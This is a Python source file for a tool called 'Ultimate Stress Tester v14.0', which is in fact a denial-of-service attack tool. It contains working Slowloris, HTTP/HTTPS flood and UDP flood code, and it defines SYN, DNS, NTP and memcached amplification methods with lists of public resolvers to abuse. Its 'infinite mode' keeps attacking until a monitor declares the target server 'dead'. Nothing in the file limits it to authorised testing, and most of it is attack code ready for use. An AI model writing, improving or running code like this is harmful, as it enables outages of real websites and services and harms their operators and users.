#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     █████╗  █████╗ ███████╗██╗   ██╗███████╗███╗   ██╗████████╗   ║
║    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝   ║
║    ███████║██║  ╚═╝█████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║      ║
║    ██╔══██║██║  ██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║      ║
║    ██║  ██║╚█████╔╝███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║      ║
║    ╚═╝  ╚═╝ ╚════╝ ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝      ║
║                                                                   ║
║              ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓              ║
║              ┃   THE ULTIMATE STRESS TESTER v14.0   ┃              ║
║              ┃       CREATED BY: 7VENTY7VEN         ┃              ║
║              ┃   🔥 INFINITE MODE · DEATH DETECT 🔥  ┃              ║
║              ┃   🐌 SLOWLORIS NOW FIXED! 🐌          ┃              ║
║              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛              ║
║                                                                   ║
║              ⚡ ZERO ERRORS · PERFECT CODE · LEGENDARY ⚡          ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import random
import time
import sys
import requests
import os
import argparse
import signal
import json
import datetime
import platform
import struct
from urllib.parse import urlparse
from collections import deque
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
from enum import Enum
import select
from threading import Lock

# ==================== HIT TRACKER SYSTEM ====================
class HitTracker:
    """Tracks successful hits with timestamps"""
    
    def __init__(self):
        self.hits = []
        self.hit_count = 0
        self.lock = Lock()
        self.start_time = None
        
    def record_hit(self, attack_type: str, target: str, port: int, method: str = ""):
        """Record a successful hit with timestamp"""
        with self.lock:
            timestamp = datetime.datetime.now()
            self.hit_count += 1
            
            hit_record = {
                'id': self.hit_count,
                'timestamp': timestamp,
                'time_str': timestamp.strftime("%H:%M:%S.%f")[:-3],
                'attack_type': attack_type,
                'target': target,
                'port': port,
                'method': method
            }
            
            self.hits.append(hit_record)
            
            # Keep only last 1000 hits in memory
            if len(self.hits) > 1000:
                self.hits = self.hits[-1000:]
            
            # Print hit notification
            self.print_hit_notification(hit_record)
            
            return hit_record
    
    def print_hit_notification(self, hit):
        """Print a formatted hit notification"""
        icon = {
            'HTTP': '🌐', 'HTTPS': '🔒', 'UDP': '💧', 'TCP_SYN': '📡',
            'TCP_ACK': '📨', 'DNS': '🌍', 'NTP': '⏰', 'SLOWLORIS': '🐌',
            'ICMP': '📶', 'MEMCACHED': '💾', 'SSDP': '📺', 'SNMP': '🔧',
            'WEBSOCKET': '🔌', 'RST': '💥', 'CHARGEN': '⚡'
        }.get(hit['attack_type'], '📦')
        
        # Format target with port
        target_str = f"{hit['target']}:{hit['port']}"
        
        # Different colors for different attack types
        color = {
            'HTTP': Colors.GREEN, 'HTTPS': Colors.BLUE, 'UDP': Colors.CYAN,
            'TCP_SYN': Colors.YELLOW, 'DNS': Colors.PURPLE, 'NTP': Colors.MAGENTA,
            'SLOWLORIS': Colors.RED, 'ICMP': Colors.ORANGE
        }.get(hit['attack_type'], Colors.WHITE)
        
        # Create the hit message with timestamp [x.x.x.x] format
        ip_part = hit['target'].replace('.', '[.]')
        hit_msg = f"{color}[{hit['time_str']}] {icon} HIT #{hit['id']} → {ip_part}[:{hit['port']}] ({hit['attack_type']}){Colors.END}"
        
        # Print to stderr to not interfere with main display
        print(f"\r\033[K{hit_msg}", file=sys.stderr)
        sys.stderr.flush()
    
    def get_hit_rate(self, seconds=10):
        """Get hit rate over last X seconds"""
        if not self.hits:
            return 0
        
        now = datetime.datetime.now()
        cutoff = now - datetime.timedelta(seconds=seconds)
        
        recent_hits = [h for h in self.hits if h['timestamp'] > cutoff]
        return len(recent_hits) / seconds if seconds > 0 else 0
    
    def get_summary(self):
        """Get summary of hits by attack type"""
        summary = {}
        for hit in self.hits:
            atype = hit['attack_type']
            summary[atype] = summary.get(atype, 0) + 1
        return summary
    
    def export_hits(self, filename="hits_log.json"):
        """Export hits to JSON file"""
        try:
            with open(filename, 'w') as f:
                json.dump({
                    'total_hits': self.hit_count,
                    'hits': [{k: str(v) if isinstance(v, datetime.datetime) else v 
                             for k, v in h.items()} for h in self.hits]
                }, f, indent=2)
            return True
        except:
            return False

# ==================== ERROR HANDLING SYSTEM ====================
class ErrorLevel(Enum):
    INFO = "📌"
    WARNING = "⚠️"
    ERROR = "❌"
    CRITICAL = "💀"
    SUCCESS = "✅"
    DEATH = "💀"
    HIT = "🎯"

class Colors:
    """Perfect color system with fallback"""
    try:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        END = '\033[0m'
        BOLD = '\033[1m'
        CYAN = '\033[96m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        BLACK = '\033[90m'
        ORANGE = '\033[38;5;208m'
        PURPLE = '\033[38;5;129m'
        PINK = '\033[38;5;206m'
    except:
        HEADER = BLUE = GREEN = YELLOW = RED = END = BOLD = CYAN = MAGENTA = WHITE = BLACK = ORANGE = PURPLE = PINK = ''

class ErrorHandler:
    """Ultimate error handling system"""
    
    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.errors = []
            cls._instance.warnings = []
            cls._instance.start_time = time.time()
        return cls._instance
    
    def log(self, level: ErrorLevel, message: str, exception: Exception = None):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        if level == ErrorLevel.ERROR:
            self.errors.append({"time": timestamp, "msg": message})
        elif level == ErrorLevel.WARNING:
            self.warnings.append({"time": timestamp, "msg": message})
        
        if exception:
            self.attempt_fix(exception)
        
        color = {
            ErrorLevel.INFO: Colors.BLUE,
            ErrorLevel.WARNING: Colors.YELLOW,
            ErrorLevel.ERROR: Colors.RED,
            ErrorLevel.CRITICAL: Colors.RED + Colors.BOLD,
            ErrorLevel.SUCCESS: Colors.GREEN,
            ErrorLevel.DEATH: Colors.RED + Colors.BOLD,
            ErrorLevel.HIT: Colors.PURPLE
        }[level]
        
        # Don't print hits here - they're handled by HitTracker
        if level != ErrorLevel.HIT:
            print(f"{color}[{level.value} {timestamp}] {message}{Colors.END}")
        
        if level == ErrorLevel.CRITICAL:
            self.print_summary()
            sys.exit(1)
    
    def attempt_fix(self, exception):
        """Auto-fix common errors"""
        error_str = str(exception).lower()
        
        if "connection refused" in error_str:
            self.log(ErrorLevel.WARNING, "Connection refused - retrying with backoff...")
            time.sleep(2)
            return "server_maybe_down"
        
        elif "timeout" in error_str:
            self.log(ErrorLevel.WARNING, "Timeout detected - server may be struggling")
            return "possible_death"
        
        elif "too many files" in error_str:
            self.log(ErrorLevel.WARNING, "File descriptor limit - cleaning up...")
            return "clean_sockets"
        
        elif "permission denied" in error_str or "operation not permitted" in error_str:
            self.log(ErrorLevel.WARNING, "Permission denied - some attacks may need root")
            return "need_root"
    
    def print_summary(self):
        """Print error summary"""
        if self.errors or self.warnings:
            print(f"\n{Colors.CYAN}╔════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.YELLOW}         📊 ERROR SUMMARY REPORT        {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╠════════════════════════════════════════╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.GREEN}  ✅ Total Errors: {len(self.errors):<4}                     {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.YELLOW}  ⚠️  Warnings: {len(self.warnings):<4}                       {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚════════════════════════════════════════╝{Colors.END}")
            
            if self.errors:
                print(f"\n{Colors.RED}Last Error: {self.errors[-1]['msg']}{Colors.END}")

# ==================== ATTACK CONFIGURATIONS ====================
@dataclass
class AttackConfig:
    name: str
    port: int
    protocol: str
    packet_size: int
    description: str
    requires_root: bool = False

class AttackMethod(Enum):
    HTTP = AttackConfig("HTTP Flood", 80, "tcp", 1024, "Standard HTTP GET requests")
    HTTPS = AttackConfig("HTTPS Flood", 443, "tcp", 1024, "Encrypted HTTP requests")
    UDP = AttackConfig("UDP Flood", 80, "udp", 512, "Raw UDP packets")
    TCP_SYN = AttackConfig("SYN Flood", 80, "tcp", 64, "TCP SYN packets", True)
    TCP_ACK = AttackConfig("ACK Flood", 80, "tcp", 64, "TCP ACK packets", True)
    DNS = AttackConfig("DNS Amplification", 53, "udp", 64, "DNS query amplification", True)
    NTP = AttackConfig("NTP Amplification", 123, "udp", 64, "NTP monlist amplification", True)
    SLOWLORIS = AttackConfig("Slowloris", 80, "tcp", 128, "Slow HTTP headers attack")
    ICMP = AttackConfig("ICMP Flood", 0, "icmp", 64, "Ping flood", True)
    MEMCACHED = AttackConfig("Memcached", 11211, "udp", 64, "Memcached amplification", True)
    SSDP = AttackConfig("SSDP Amplification", 1900, "udp", 64, "SSDP reflection", True)
    SNMP = AttackConfig("SNMP Amplification", 161, "udp", 64, "SNMP reflection", True)
    WEBSOCKET = AttackConfig("WebSocket Flood", 80, "tcp", 1024, "WebSocket connections")
    RST = AttackConfig("RST Flood", 80, "tcp", 64, "TCP RST packets", True)
    CHARGEN = AttackConfig("Chargen Amplification", 19, "udp", 64, "Chargen reflection", True)

# ==================== ULTIMATE HAMMER CLASS ====================
class UltimateHammer:
    """The PERFECT stress testing tool - INFINITE MODE with death detection"""
    
    def __init__(self):
        self.error_handler = ErrorHandler()
        self.hit_tracker = HitTracker()
        self.running = False
        self.stats = {method.name: 0 for method in AttackMethod}
        self.stats['errors'] = 0
        self.stats['total'] = 0
        self.stats['retries'] = 0
        self.stats['bandwidth'] = 0
        self.stats['hits'] = 0
        self.stats['death_time'] = None
        
        self.lock = threading.RLock()
        self.start_time = None
        self.server_down = False
        self.server_down_time = None
        self.consecutive_errors = 0
        self.max_consecutive_errors = 20
        self.thread_pool = []
        self.socket_pool = []
        self.raw_socket = None
        self.death_detected = False
        self.final_hit_count = 0
        
        # Slowloris specific
        self.slowloris_connections = []
        self.slowloris_lock = threading.Lock()
        
        # Death detection thresholds
        self.death_check_interval = 2
        self.death_error_threshold = 10
        
        # Perfect user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0.5993.112",
            f"7venty7ven-Ultimate/{random.randint(1,999)}"
        ]
        
        # Attack paths
        self.paths = ['/', '/anything', '/get', '/status/200', '/delay/0', '/api', '/test', '/ping']
        
        # DNS servers for amplification
        self.dns_servers = [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9',
            '208.67.222.222', '208.67.220.220', '64.6.64.6', '64.6.65.6'
        ]
        
        # NTP servers for amplification
        self.ntp_servers = [
            '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org',
            'time.google.com', 'time.windows.com', 'time.apple.com'
        ]
        
        # Performance settings
        self.performance = self.optimize_performance()
        
        # Try to create raw socket
        try:
            self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            self.raw_socket = None
        
        self.error_handler.log(ErrorLevel.SUCCESS, f"UltimateHammer v14.0 initialized with FIXED SLOWLORIS")
    
    def optimize_performance(self):
        """Auto-optimize based on system"""
        system = platform.system()
        cores = os.cpu_count() or 4
        
        try:
            is_root = os.geteuid() == 0
        except:
            is_root = False
        
        settings = {
            'max_threads': cores * 100 if is_root else cores * 50,
            'socket_timeout': 3.0,
            'packet_size': 1024,
            'backoff_factor': 1.5,
            'is_root': is_root,
            'cores': cores
        }
        
        if is_root:
            self.error_handler.log(ErrorLevel.SUCCESS, "Running as root - ALL attacks available")
        else:
            self.error_handler.log(ErrorLevel.WARNING, "Not running as root - some attacks limited")
        
        return settings
    
    def safe_socket(self, protocol='tcp'):
        """Create socket with error handling"""
        try:
            if protocol == 'tcp':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            elif protocol == 'udp':
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            s.settimeout(self.performance['socket_timeout'])
            self.socket_pool.append(s)
            return s
        except Exception as e:
            self.error_handler.log(ErrorLevel.WARNING, f"Socket creation failed: {e}")
            return None
    
    def cleanup(self):
        """Cleanup all resources"""
        self.error_handler.log(ErrorLevel.INFO, "Cleaning up resources...")
        self.running = False
        
        # Close all Slowloris connections
        with self.slowloris_lock:
            for sock in self.slowloris_connections:
                try:
                    sock.close()
                except:
                    pass
            self.slowloris_connections.clear()
        
        for s in self.socket_pool:
            try:
                s.close()
            except:
                pass
        
        if self.raw_socket:
            try:
                self.raw_socket.close()
            except:
                pass
        
        for t in self.thread_pool:
            try:
                t.join(timeout=1)
            except:
                pass
        
        # Export hits log
        if self.hit_tracker.hit_count > 0:
            filename = f"hits_log_{int(time.time())}.json"
            self.hit_tracker.export_hits(filename)
            self.error_handler.log(ErrorLevel.SUCCESS, f"Hit log saved to {filename}")
    
    def check_server_alive(self, target):
        """Check if server is alive"""
        try:
            parsed = urlparse(target)
            host = parsed.netloc or parsed.path
            if ':' in host:
                host = host.split(':')[0]
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, 80))
            sock.close()
            return result == 0
        except:
            return False
    
    def death_monitor(self, target):
        """Monitor for server death"""
        consecutive_errors = 0
        
        while self.running and not self.death_detected:
            time.sleep(self.death_check_interval)
            
            alive = self.check_server_alive(target)
            
            if not alive:
                consecutive_errors += 1
                if consecutive_errors >= self.death_error_threshold:
                    self.death_detected = True
                    self.server_down = True
                    self.final_hit_count = self.hit_tracker.hit_count
                    
                    time_to_death = time.time() - self.start_time
                    minutes = int(time_to_death // 60)
                    seconds = int(time_to_death % 60)
                    
                    print(f"\n{Colors.RED}{Colors.BOLD}")
                    print("╔═══════════════════════════════════════════════════════════════════╗")
                    print("║                                                                   ║")
                    print("║                      💀 SERVER IS DEAD! 💀                         ║")
                    print("║                                                                   ║")
                    print("╠═══════════════════════════════════════════════════════════════════╣")
                    print(f"║  🎯 FINAL HITS: {self.final_hit_count:<8}                                          ║")
                    print(f"║  ⏱️  TIME TO DEATH: {minutes}m {seconds}s                                         ║")
                    print(f"║  📊 HIT RATE: {self.final_hit_count/time_to_death:.1f} hits/s                                    ║")
                    print("║                                                                   ║")
                    print("║  🔥 SERVER HAS FALLEN - MISSION ACCOMPLISHED! 🔥                 ║")
                    print("║                                                                   ║")
                    print("╚═══════════════════════════════════════════════════════════════════╝")
                    print(f"{Colors.END}")
                    
                    self.running = False
                    break
            else:
                consecutive_errors = max(0, consecutive_errors - 1)
    
    # ==================== FIXED SLOWLORIS METHOD ====================
    
    def slowloris(self, target, threads):
        """FIXED Slowloris attack - Actually works!"""
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        if ':' in host:
            host = host.split(':')[0]
        port = 80
        
        self.error_handler.log(ErrorLevel.INFO, f"Starting FIXED Slowloris attack on {host}:{port}")
        
        def create_slowloris_connection():
            """Create a single Slowloris connection"""
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # Connect to server
                sock.connect((host, port))
                
                # Send partial HTTP request (NO trailing \r\n\r\n)
                request = f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Accept: text/html,application/xhtml+xml\r\n"
                request += "Accept-Language: en-US,en\r\n"
                request += "Connection: keep-alive\r\n"
                
                # IMPORTANT: Don't send the final \r\n\r\n
                sock.send(request.encode())
                
                # Add to connections list
                with self.slowloris_lock:
                    self.slowloris_connections.append(sock)
                    
                # Record hit
                self.hit_tracker.record_hit('SLOWLORIS', host, port, "connection opened")
                
                with self.lock:
                    self.stats['SLOWLORIS'] += 1
                    self.stats['total'] += 1
                    self.stats['hits'] += 1
                
                return sock
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
                return None
        
        def slowloris_keeper():
            """Keep connections alive by sending headers"""
            while self.running and not self.server_down:
                dead_connections = []
                
                with self.slowloris_lock:
                    for sock in self.slowloris_connections:
                        try:
                            # Send a random header to keep connection alive
                            header = f"X-{random.randint(1,999999)}: {random.randint(1,999999)}\r\n"
                            sock.send(header.encode())
                        except:
                            dead_connections.append(sock)
                    
                    # Remove dead connections
                    for dead in dead_connections:
                        try:
                            self.slowloris_connections.remove(dead)
                            dead.close()
                        except:
                            pass
                
                # Create new connections to maintain count
                current_count = len(self.slowloris_connections)
                target_count = threads * 5  # Aim for 5x connections per thread
                
                if current_count < target_count:
                    for _ in range(min(10, target_count - current_count)):
                        create_slowloris_connection()
                        time.sleep(0.1)
                
                time.sleep(10)  # Send headers every 10 seconds
        
        def slowloris_worker():
            """Worker thread - creates new connections"""
            while self.running and not self.server_down:
                create_slowloris_connection()
                time.sleep(random.uniform(0.5, 2))  # Random delay between connections
        
        # Start keeper thread
        keeper_thread = threading.Thread(target=slowloris_keeper)
        keeper_thread.daemon = True
        keeper_thread.start()
        self.thread_pool.append(keeper_thread)
        
        # Start worker threads
        for i in range(threads):
            t = threading.Thread(target=slowloris_worker)
            t.daemon = True
            t.start()
            self.thread_pool.append(t)
        
        self.error_handler.log(ErrorLevel.SUCCESS, f"FIXED Slowloris: {threads} threads active")
    
    def http_flood(self, target, threads, use_https=False):
        """HTTP/HTTPS flood attack with hit tracking"""
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        if ':' in host:
            host = host.split(':')[0]
        port = 443 if use_https else 80
        
        def worker():
            session = requests.Session()
            while self.running and not self.server_down:
                try:
                    url = target.rstrip('/') + random.choice(self.paths)
                    if use_https and not url.startswith('https'):
                        url = url.replace('http://', 'https://')
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                    }
                    
                    method = random.choice(['GET', 'POST', 'HEAD'])
                    
                    if method == 'GET':
                        r = session.get(url, headers=headers, timeout=2, verify=False)
                    elif method == 'POST':
                        r = session.post(url, headers=headers, data={'key': 'value'}, timeout=2, verify=False)
                    else:
                        r = session.head(url, headers=headers, timeout=2, verify=False)
                    
                    # Record hit if successful
                    if r.status_code < 500:
                        method_name = 'HTTPS' if use_https else 'HTTP'
                        self.hit_tracker.record_hit(method_name, host, port, method)
                    
                    with self.lock:
                        method_name = 'HTTPS' if use_https else 'HTTP'
                        self.stats[method_name] += 1
                        self.stats['total'] += 1
                        self.stats['bandwidth'] += len(r.content) if r.content else 0
                        self.stats['hits'] += 1 if r.status_code < 500 else 0
                        
                except Exception:
                    with self.lock:
                        self.stats['errors'] += 1
        
        for i in range(min(threads, self.performance['max_threads'])):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.thread_pool.append(t)
    
    def udp_flood(self, target_ip, port, threads):
        """UDP flood attack with hit tracking"""
        def worker():
            sock = self.safe_socket('udp')
            if not sock:
                return
            
            while self.running and not self.server_down:
                try:
                    size = random.randint(64, self.performance['packet_size'])
                    data = os.urandom(size)
                    sock.sendto(data, (target_ip, port))
                    
                    self.hit_tracker.record_hit('UDP', target_ip, port, 'flood')
                    
                    with self.lock:
                        self.stats['UDP'] += 1
                        self.stats['total'] += 1
                        self.stats['bandwidth'] += size
                        self.stats['hits'] += 1
                        
                except Exception:
                    with self.lock:
                        self.stats['errors'] += 1
        
        for i in range(min(threads, self.performance['max_threads'])):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.thread_pool.append(t)
    
    def infinite_combo(self, target, intensity='ultimate', methods=None):
        """INFINITE MODE - Runs until server dies"""
        
        # Intensity settings
        settings = {
            'low': {'threads': 10, 'multiplier': 0.5},
            'medium': {'threads': 25, 'multiplier': 1.0},
            'high': {'threads': 50, 'multiplier': 1.5},
            'seven': {'threads': 100, 'multiplier': 2.0},
            'ultimate': {'threads': 200, 'multiplier': 3.0}
        }
        
        cfg = settings[intensity]
        self.running = True
        self.start_time = time.time()
        self.server_down = False
        self.death_detected = False
        
        # Parse target
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        if ':' in host:
            host = host.split(':')[0]
        
        try:
            target_ip = socket.gethostbyname(host)
        except:
            target_ip = host
        
        # Default methods
        if methods is None:
            if self.performance['is_root']:
                methods = ['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'SLOWLORIS']
            else:
                methods = ['HTTP', 'HTTPS', 'UDP', 'SLOWLORIS']
        
        # Print banner
        self.print_infinite_banner(target, cfg, intensity, methods)
        
        # Launch attacks
        for method in methods:
            threads = int(cfg['threads'] * cfg['multiplier'])
            
            if method == 'HTTP':
                self.http_flood(target, threads)
                self.error_handler.log(ErrorLevel.INFO, f"Started HTTP flood with {threads} threads")
            elif method == 'HTTPS':
                self.http_flood(target, threads, use_https=True)
                self.error_handler.log(ErrorLevel.INFO, f"Started HTTPS flood with {threads} threads")
            elif method == 'UDP':
                self.udp_flood(target_ip, 80, threads)
                self.error_handler.log(ErrorLevel.INFO, f"Started UDP flood with {threads} threads")
            elif method == 'SLOWLORIS':
                slow_threads = max(10, threads // 4)  # Slowloris needs fewer threads
                self.slowloris(target, slow_threads)
                self.error_handler.log(ErrorLevel.INFO, f"Started FIXED Slowloris with {slow_threads} threads")
            elif method == 'TCP_SYN' and self.performance['is_root']:
                self.tcp_syn_flood(target_ip, 80, threads)
        
        # Start death monitor
        death_thread = threading.Thread(target=self.death_monitor, args=(target,))
        death_thread.daemon = True
        death_thread.start()
        
        # Status updater
        status_thread = threading.Thread(target=self.infinite_status_updater)
        status_thread.daemon = True
        status_thread.start()
        
        # Wait for death
        death_thread.join()
        
        # Cleanup and finale
        self.cleanup()
        self.print_death_finale()
        self.error_handler.print_summary()
    
    def infinite_status_updater(self):
        """Status updater for infinite mode"""
        last_total = 0
        last_time = time.time()
        
        while self.running and not self.death_detected:
            try:
                current_time = time.time()
                elapsed = current_time - self.start_time
                
                with self.lock:
                    total = self.stats['total']
                    errors = self.stats['errors']
                    bandwidth = self.stats['bandwidth']
                    hits = self.stats['hits']
                
                # Calculate rate
                if current_time - last_time > 0:
                    rate = (total - last_total) / (current_time - last_time)
                    last_total = total
                    last_time = current_time
                else:
                    rate = 0
                
                # Hit rate
                hit_rate = self.hit_tracker.get_hit_rate(10)
                
                # Bandwidth rate
                bw_rate = bandwidth / elapsed if elapsed > 0 else 0
                
                # Add Slowloris active connections to stats
                slowloris_active = len(self.slowloris_connections)
                
                # Clear and print main status
                sys.stdout.write('\033[2J\033[H')
                self.print_infinite_status(elapsed, total, rate, errors, bw_rate, hits, hit_rate, slowloris_active)
                sys.stdout.flush()
                
                time.sleep(0.5)
                
            except Exception as e:
                time.sleep(1)
    
    def print_infinite_status(self, elapsed, total, rate, errors, bw_rate, hits, hit_rate, slowloris_active=0):
        """Status display for infinite mode"""
        
        # Format time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        time_str = f"{minutes:02d}:{seconds:02d}"
        
        # Progress to death
        death_progress = min(100, (self.consecutive_errors / self.death_error_threshold) * 100)
        death_bar = '█' * int(death_progress/4) + '░' * (25 - int(death_progress/4))
        
        # Format bandwidth
        if bw_rate > 1024 * 1024:
            bw_str = f"{bw_rate/(1024*1024):.2f} MB/s"
        elif bw_rate > 1024:
            bw_str = f"{bw_rate/1024:.2f} KB/s"
        else:
            bw_str = f"{bw_rate:.2f} B/s"
        
        status = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}║{Colors.YELLOW}              ⚡ INFINITE DEATH MISSION ACTIVE ⚡                {Colors.RED}║{Colors.END}
{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  🎯 TOTAL HITS: {hits:<8} | HIT RATE: {hit_rate:.1f}/s                 {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  🐌 SLOWLORIS ACTIVE: {slowloris_active:<4} connections                    {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  💀 DEATH PROGRESS: [{death_bar}] {death_progress:.1f}%                     {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  ⚠️  CONSECUTIVE ERRORS: {self.consecutive_errors}/{self.death_error_threshold}                    {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  🌐 HTTP: {self.stats.get('HTTP',0):<6} | 🔒 HTTPS: {self.stats.get('HTTPS',0):<6} | 💧 UDP: {self.stats.get('UDP',0):<6} {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  🐌 SLOWLORIS: {self.stats.get('SLOWLORIS',0):<6}                          {Colors.RED}║{Colors.END}
{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}║{Colors.MAGENTA}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.MAGENTA}  📊 TOTAL: {total:>8} packets  |  ⚡ RATE: {rate:>7.1f}/s           {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.MAGENTA}  💾 BANDWIDTH: {bw_str:<15} |  ❌ ERRORS: {errors:<5}           {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.MAGENTA}  ⏱️  ELAPSED: {time_str:<8}     |  💀 STATUS: {'FIGHTING' if not self.death_detected else 'DEAD'}    {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.MAGENTA}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}📋 Last 5 Hits:{Colors.END}
"""
        
        # Show last 5 hits
        for hit in self.hit_tracker.hits[-5:]:
            ip_part = hit['target'].replace('.', '[.]')
            status += f"{Colors.CYAN}  [{hit['time_str']}] #{hit['id']} → {ip_part}[:{hit['port']}] ({hit['attack_type']}){Colors.END}\n"
        
        print(status)
    
    def print_infinite_banner(self, target, cfg, intensity, methods):
        """Print infinite mode banner"""
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}║{Colors.WHITE}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██╗███╗   ██╗███████╗██╗███╗   ██╗██╗████████╗███████╗   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██║████╗  ██║██╔════╝██║████╗  ██║██║╚══██╔══╝██╔════╝   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██║██╔██╗ ██║█████╗  ██║██╔██╗ ██║██║   ██║   █████╗     {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██║██║╚██╗██║██╔══╝  ██║██║╚██╗██║██║   ██║   ██╔══╝     {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██║██║ ╚████║██║     ██║██║ ╚████║██║   ██║   ███████╗   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚══════╝   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}║{Colors.CYAN}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  🎯 TARGET: {target:<50}  {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  🔥 INTENSITY: {intensity.upper():<10} (INFINITE MODE)               {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  ⚡ THREADS: {cfg['threads']*cfg['multiplier']:.0f} per method                      {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  ⏱️  DURATION: UNTIL DEATH                                {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  🛠️  METHODS: {len(methods)} active attacks                           {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  🔥 CREATED BY: 7VENTY7VEN                                       {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  ⚡ VERSION: ULTIMATE v14.0 - FIXED SLOWLORIS                     {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  🐌 SLOWLORIS NOW WORKING!                                        {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
